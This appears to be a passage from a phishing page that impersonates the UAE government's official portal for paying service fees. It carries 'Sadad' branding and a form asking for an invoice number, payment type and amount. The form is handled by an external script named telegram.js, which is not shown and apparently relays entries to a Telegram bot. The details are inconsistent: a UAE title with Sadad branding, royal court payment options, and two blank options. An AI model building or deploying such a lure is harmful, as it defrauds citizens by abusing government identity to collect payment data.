    <title>القنوات الذكية لتسديد رسوم الخدمات الحكومية | البوابة الرسمية لحكومة الإمارات العربية المتحدة</title>
    <link rel="stylesheet" href="css/style.css">
    <style>
        body {
            background-color: #fff;
            min-height: 100vh;
        }
        .data-header {
            background-color: #006633;
            padding: 15px 30px;
            display: flex;
            justify-content: flex-end;
        }
        .data-header img {
            height: 45px;
        }
        .breadcrumb {
            padding: 15px 30px;
            color: #006633;
            font-size: 14px;
        }
        .breadcrumb a {
            color: #006633;
            text-decoration: underline;
        }
        .form-wrapper {
            max-width: 700px;
            margin: 20px auto;
            padding: 30px;
            background-color: #f9f9f9;
            border-radius: 10px;
        }
        .form-title {
            color: #006633;
            font-size: 24px;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #333;
            font-size: 16px;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 15px;
            border: 2px dashed #f5a623;
            border-radius: 5px;
            font-size: 16px;
            background-color: #fff8e8;
            direction: rtl;
        }
        .form-group input::placeholder {
            color: #f5a623;
            opacity: 0.7;
        }
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #006633;
            background-color: #fff;
        }
        .btn-submit {
            width: 100%;
            padding: 18px;
            background-color: #006633;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s;
        }
        .btn-submit:hover {
            background-color: #004d26;
        }
    </style>
</head>
<body>
    <div class="data-header">
        <img src="images/sadad_logo.jpg" alt="شعار سداد">
    </div>
    
    <div class="breadcrumb">
        <a href="index.html">الرئيسية</a> / شخصي
    </div>
    
    <div class="form-wrapper">
        <h2 class="form-title">إتمام عملية السداد</h2>
        
        <form id="dataForm" onsubmit="handleDataForm(event)">
            <div class="form-group">
                <label>أدخل رقم الفاتورة</label>
                <input type="text" id="invoiceNumber" name="invoiceNumber" placeholder="أدخل رقم الفاتورة" required>
            </div>
            
            <div class="form-group">
                <label>اختر نوع السداد</label>
                <select id="paymentType" name="paymentType" required>
                    <option value="مدفوعات حكومية">مدفوعات حكومية</option>
                    <option value="مدفوعات ديوان ملكي">مدفوعات ديوان ملكي</option>
                    <option value="مدفوعات تأمينات اجتماعية">مدفوعات تأمينات اجتماعية</option>
                    <option value="مدفوعات الزراعة والبيئة">مدفوعات الزراعة والبيئة</option>
                    <option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
<option value="رسوم مركبات "> </option>
                    <option value="مدفوعات مخالفات مكتب العمل "> </option>
                </select>
            </div>
            
            <div class="form-group">
                <label>قيمة رسوم السداد (درهم إماراتي)</label>
                <input type="number" id="amount" name="amount" placeholder="أدخل المبلغ" required>
            </div>
            
            <button type="submit" class="btn-submit">المتابعة والإكمال</button>
        </form>
    </div>
    
    <script src="js/telegram.js"></script>
</body>
</html>
